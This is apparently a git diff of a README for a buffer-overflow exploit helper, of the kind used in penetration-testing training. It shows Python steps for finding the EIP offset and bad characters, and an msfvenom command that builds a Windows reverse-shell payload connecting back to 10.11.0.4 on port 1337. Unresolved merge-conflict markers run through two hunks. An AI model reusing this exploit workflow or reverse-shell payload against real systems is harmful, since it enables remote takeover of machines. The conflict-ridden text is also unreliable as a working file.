@@ -50,8 +50,12 @@ def main():
 	#     an additional 300-400 bytes. Ex. During my test run it took around 800
 	obj.send_pattern()
 
+<<<<<<< HEAD
 	# Get offset
 	# pass in the value that overwrote the eip register and get offset
+=======
+	# Get offset 
+>>>>>>> ac33bf296928a3784b39cf0c1f301d4633545acf
 	offset = obj.get_offset("30416B30")
 	print(offset)
 
@@ -71,9 +75,13 @@ def main():
 	#     only after sending the initial bad characters payload.
 	obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")
 
+<<<<<<< HEAD
 	# Send payload with all characters to find bad characters.
 	# [!] bad characters are removed depending on the characters passed
 	#     as arguments to the `add_bad_char` function
+=======
+	# Send payload with all characters to find bad characters
+>>>>>>> ac33bf296928a3784b39cf0c1f301d4633545acf
 	obj.send_bad_chars()
 
 	# Set the memory address to jump to after finding valid memory address
@@ -124,7 +132,7 @@ if __name__ == '__main__':
 ## Generating payload
 ```bash
 # Sample payload with Msfvenom:
- msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
 
 # Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options!
 ```
